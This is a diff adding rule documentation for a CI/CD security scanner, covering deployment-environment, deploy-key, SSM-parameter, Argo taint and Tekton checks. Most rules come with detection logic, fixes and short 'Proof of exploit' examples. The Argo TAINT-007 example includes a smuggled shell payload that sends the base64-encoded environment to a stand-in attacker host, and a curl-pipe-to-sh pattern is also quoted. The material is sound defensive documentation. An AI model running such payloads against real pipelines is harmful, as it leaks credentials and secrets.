+**Evidences:** [`CICD-SEC-1`](#ctrl-cicd-sec-1) Insufficient Flow Control Mechanisms, [`CICD-SEC-5`](#ctrl-cicd-sec-5) Insufficient PBAC.
+
+**How this is detected.** Walks ``GET /repos/{owner}/{repo}/environments`` and flags every environment whose ``protection_rules`` list doesn't include a rule with ``type == "required_reviewers"``. Passes silently when no environments are configured (``total_count: 0``) — there's nothing to evaluate. Pairs with GHA-050 (the workflow-layer rule that checks ``jobs.<id>.environment:`` is declared) and SCM-024 (deployment-branch-policy on the same environments).
+
+**Recommendation.** Configure required reviewers on every deployment environment (Settings → Environments → <name> → ``Required reviewers``). Pick a team or set of users who must approve each deployment job that targets the environment. Without a required-reviewer protection rule, any workflow run with the right environment name in its ``jobs.<id>.environment:`` block can deploy without human gate — the exact primitive GHA-050 (publish without OIDC + environment) catches at the workflow layer. SCM-023 is the org-level complement: a workflow that *declares* an environment still needs the environment itself to enforce the gate.
+
+**Known false positives.**
+
+- Non-production environments (``preview``, ``staging-ephemeral``) that legitimately auto-deploy without human gate are flagged by this rule, since GitHub doesn't distinguish environment severity. Suppress on those specific environment names with a rationale rather than disabling the rule for the whole repo.
+
+**Source:** [`SCM-023`](../providers/scm.md#scm-023) in the [SCM provider](../providers/scm.md).
+
+#### `SCM-024`: Deployment environment can deploy from any branch <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-024 }
+
+**Evidences:** [`CICD-SEC-1`](#ctrl-cicd-sec-1) Insufficient Flow Control Mechanisms, [`CICD-SEC-4`](#ctrl-cicd-sec-4) Poisoned Pipeline Execution.
+
+**How this is detected.** Reads each environment's ``deployment_branch_policy`` field. ``null`` means any branch can deploy and fails; ``{"protected_branches": true}`` or ``{"custom_branch_policies": true}`` (with at least one configured policy) passes. Passes silently when no environments are configured. Pairs with SCM-023 (required reviewers on the same environments); both knobs together close the deploy-gate loop.
+
+**Recommendation.** Configure a deployment-branch policy on every environment (Settings → Environments → <name> → ``Deployment branches and tags``). Pick ``Protected branches only`` for production-like environments so a workflow run on a feature branch cannot push to production. The combination ``required reviewers`` (SCM-023) + ``deployment branch policy`` (SCM-024) is the deploy-gate the rest of the rule pack (GHA-050 publish-without-OIDC, SCM-001 branch protection) assumes is in place; without SCM-024, a workflow on any branch can target the production environment and reviewers approve a stale or wrong-branch deployment without realizing.
+
+**Known false positives.**
+
+- Test / preview environments often accept any branch by design (the whole point is to validate feature branches before merging). Suppress on those specific environment names; treat the rule as production-scoped.
+
+**Source:** [`SCM-024`](../providers/scm.md#scm-024) in the [SCM provider](../providers/scm.md).
+
+#### `SCM-025`: Repo has write-enabled deploy keys (push backdoor) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-025 }
+
+**Evidences:** [`CICD-SEC-2`](#ctrl-cicd-sec-2) Inadequate Identity and Access Management, [`CICD-SEC-6`](#ctrl-cicd-sec-6) Insufficient Credential Hygiene.
+
+**How this is detected.** Reads ``GET /repos/{owner}/{repo}/keys`` and flags every deploy key whose ``read_only`` field is false. Requires ``admin`` scope on the repo; without it GitHub returns 403 / 404 and the rule passes silently with an unavailability note. Deploy keys come in two shapes: read-only (clone access only, safe equivalent of a public-fork checkout) and write-enabled (push access, the failure case this rule catches). The endpoint returns the SSH public key plus metadata, never the private half — the scan can't recover the credential, only enumerate which keys exist and what scope each carries.
+
+Complements every branch-protection rule in the pack: without SCM-025, an unaudited write deploy key bypasses the entire control set the other rules document. Also pairs with SCM-018 (PR-review bypass allowance) and SCM-019 (push-restriction allowlist), which catch the same risk shape on the user / team side.
+
+**Recommendation.** Convert every deploy key to read-only (Settings → Deploy keys → uncheck ``Allow write access``), then rotate the underlying SSH key pair if the previous holder no longer needs write access. Deploy keys are repo-scoped SSH credentials that bypass GitHub's normal RBAC — anyone with the private half can push directly, side-stepping branch protection (SCM-001), required reviews (SCM-002), CODEOWNERS (SCM-011), and the user-account audit trail. If the use case genuinely needs push (a CI runner that tags releases, a release-bot account), prefer a fine-grained PAT or a GitHub App with constrained scope, both of which carry user-visible audit-log entries that deploy keys do not.
+
+**Known false positives.**
+
+- Some CI flows legitimately use a write deploy key for release tagging or auto-generated docs commits. The right pattern is a GitHub App or a fine-grained PAT with an audit trail; deploy keys persist indefinitely and leave no record of who used them. Suppress with a one-line rationale that names the specific key title.
+
+**Seen in the wild.**
+
+- Long-running pattern of forgotten deploy keys retaining write access years after the original owner left an org. Public catalogs of leaked SSH private keys on paste sites and GitHub itself routinely hit configured deploy keys; the corresponding repo is push-compromised until the operator revokes the key.
+
+**Proof of exploit.**
+
+# Vulnerable: a write-enabled deploy key sits on the repo
+# for years. The private half lived on a contractor's
+# laptop and was checked into a public gist during a
+# transient debug session.
+GET /repos/acme/payments-api/keys
+[
+  {
+    "id": 42,
+    "title": "ci-runner-prod (added 2021-03)",
+    "key": "ssh-ed25519 AAAA... ci-runner",
+    "read_only": false,
+    "created_at": "2021-03-04T10:00:00Z"
+  }
+]
+
+# Attack: ``git push git@github.com:acme/payments-api.git``
+# using the leaked private key writes directly to master,
+# bypassing every required-review / CODEOWNERS / status-
+# check gate the other SCM rules document. The push shows
+# up in the audit log as ``key:42`` rather than a user
+# account, so detection requires correlation across
+# audit-log events most operators never review.
+
+# Safe: revoke the deploy key. If write access is
+# genuinely required for CI tagging, switch to a GitHub
+# App with constrained scope plus a one-line audit-log
+# entry per push.
+
+**Source:** [`SCM-025`](../providers/scm.md#scm-025) in the [SCM provider](../providers/scm.md).
+
 #### `SIGN-001`: No AWS Signer profile defined for Lambda deploys <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-sign-001 }
 
 **Evidences:** [`CICD-SEC-9`](#ctrl-cicd-sec-9) Improper Artifact Integrity Validation.
@@ -6659,6 +7788,36 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 **How this is detected.** An SSM ``String`` parameter is plaintext at rest and at API; ``ssm:GetParameter`` without any KMS Decrypt authority returns the value. ``SecureString`` adds KMS-encryption + the ``WithDecryption=true`` flag (which forces an explicit KMS authorization step). Secret-named parameters (``TOKEN``, ``PASSWORD``, ``KEY``) are almost always intended to be SecureString and rarely should not be.
 
 **Recommendation.** Recreate the parameter with ``Type=SecureString`` and migrate consumers to the new name if needed. Plain ``String`` parameters are visible via ``ssm:GetParameter`` without any KMS authorization.
+
+**Proof of exploit.**
+
+# Vulnerable: secret-named parameter stored as plain ``String``.
+$ aws ssm put-parameter \
+    --name /prod/api/GITHUB_TOKEN \
+    --value ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
+    --type String
+
+# Attack: any principal with the minimal ``ssm:GetParameter``
+# permission reads the cleartext, no KMS authorization needed:
+#
+#   aws ssm get-parameter --name /prod/api/GITHUB_TOKEN
+#   # Returns the plaintext, even for principals with
+#   # ``kms:Decrypt`` explicitly denied account-wide.
+#
+# CloudTrail records the GetParameter call but not the value;
+# defenders see the access only by name + principal, not what
+# was read.
+
+# Safe: SecureString forces a separate KMS authorization step.
+$ aws ssm put-parameter \
+    --name /prod/api/GITHUB_TOKEN \
+    --value ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
+    --type SecureString \
+    --key-id alias/prod-secrets
+
+# Now readers need BOTH ``ssm:GetParameter`` AND ``kms:Decrypt``
+# on the named CMK, and the call only returns plaintext when
+# ``WithDecryption=true`` is set (an explicit, auditable opt-in).
 
 **Source:** [`SSM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -6781,6 +7940,84 @@ v1 limitations: ``workflowTemplateRef:`` cross-document references aren't resolv
 **Known false positives.**
 
 - If the producer template runs a sanitiser between the tainted ``{{inputs.parameters.X}}`` interpolation and the output-path write, the consumer is no longer exploitable but TAINT-007 still fires. Suppress via ignore-file scoped to the consumer template name when this is the deliberate shape; the sanitiser is then load-bearing.
+
+**Proof of exploit.**
+
+# Vulnerable: producer template hands a tainted parameter
+# through outputs.parameters; consumer interpolates it into
+# its own shell.
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata: { generateName: ci- }
+spec:
+  entrypoint: main
+  arguments: { parameters: [ { name: title } ] }
+  templates:
+    - name: main
+      dag:
+        tasks:
+          - name: produce
+            template: read-title
+            arguments:
+              parameters:
+                - name: title
+                  value: '{{workflow.parameters.title}}'
+          - name: consume
+            template: ship
+            dependencies: [produce]
+            arguments:
+              parameters:
+                - name: clean_title
+                  value: '{{tasks.produce.outputs.parameters.title}}'
+    - name: read-title
+      inputs: { parameters: [ { name: title } ] }
+      outputs:
+        parameters:
+          - name: title
+            valueFrom: { path: /tmp/title.txt }
+      script:
+        image: alpine:3.20
+        command: [sh]
+        # BUG: tainted input written to output path unchanged.
+        source: echo '{{inputs.parameters.title}}' > /tmp/title.txt
+    - name: ship
+      inputs: { parameters: [ { name: clean_title } ] }
+      script:
+        image: alpine:3.20
+        command: [sh]
+        # BUG: re-interpolation into shell.
+        source: |
+          curl https://api/announce --data-urlencode \
+            "title={{inputs.parameters.clean_title}}"
+
+# Attack: caller submits the workflow with a parameter that
+# carries shell:
+#
+#   argo submit wf.yml \
+#     -p title='ok";curl attacker/x -d "$(env|base64)";echo "'
+#
+# ``read-title`` writes the tainted bytes verbatim to
+# /tmp/title.txt; Argo hands them through ``outputs.
+# parameters.title`` into the consumer's ``clean_title``
+# input; the consumer's ``source:`` interpolates them back
+# into the shell. The container's ServiceAccount carries
+# whatever privilege you've granted the workflow.
+
+# Safe: sanitise in the producer before writing the output,
+# and keep the consumer's reference quoted as an extra belt.
+    - name: read-title
+      inputs: { parameters: [ { name: title } ] }
+      outputs:
+        parameters:
+          - name: title
+            valueFrom: { path: /tmp/title.txt }
+      script:
+        image: alpine:3.20
+        command: [sh]
+        env:
+          - name: RAW
+            value: '{{inputs.parameters.title}}'
+        source: printf '%s' "$RAW" | tr -dc 'a-zA-Z0-9 ' > /tmp/title.txt
 
 **Source:** [`TAINT-007`](../providers/argo.md#taint-007) in the [Argo Workflows provider](../providers/argo.md).
 
@@ -6912,6 +8149,10 @@ v1 limitations: ``include:`` cross-pipeline file inclusion isn't tracked yet (wo
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Known false positives.**
+
+- Tasks running entirely against an internal mirror (``curl https://internal-mirror/install.sh | sh`` where the mirror is the same supply chain as the task image itself) carry less marginal risk than a public-internet fetch, but the rule still fires because the curl-pipe primitive is the structural signal. ``curl -k`` to a TLS endpoint with a known self-signed CA likewise triggers; the canonical fix is to install the CA into the step image and drop ``-k``, but per-task suppression via ``--ignore-file`` is the escape hatch.
+
 **Source:** [`TKN-008`](../providers/tekton.md#tkn-008) in the [Tekton provider](../providers/tekton.md).
 
 #### `TKN-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-009 }
@@ -6997,6 +8238,25 @@ The detection scans the step-level ``workspaces:`` list (``spec.steps[*].workspa
 - Some teams use a parameter to select between a small set of allowed sub-paths and rely on a step pre-check to reject anything off-list. The rule has no way to see that pre-check; suppress on the specific step name when this is the deliberate shape.
 
 **Source:** [`TKN-015`](../providers/tekton.md#tkn-015) in the [Tekton provider](../providers/tekton.md).
+
+## Mapped check IDs not found in the rule registry
+
+The standards data references check IDs the scanner does not ship. The mapping is preserved for forward-compat; once the rule lands the row will fill in automatically.
+
+- `NPM-001`
+- `NPM-002`
+- `NPM-003`
+- `NPM-004`
+- `NPM-005`
+- `NPM-006`
+- `NPM-007`
+- `NPM-011`
+- `PYPI-001`
+- `PYPI-002`
+- `PYPI-003`
+- `PYPI-004`
+- `PYPI-005`
+- `PYPI-006`
 
 ---
 
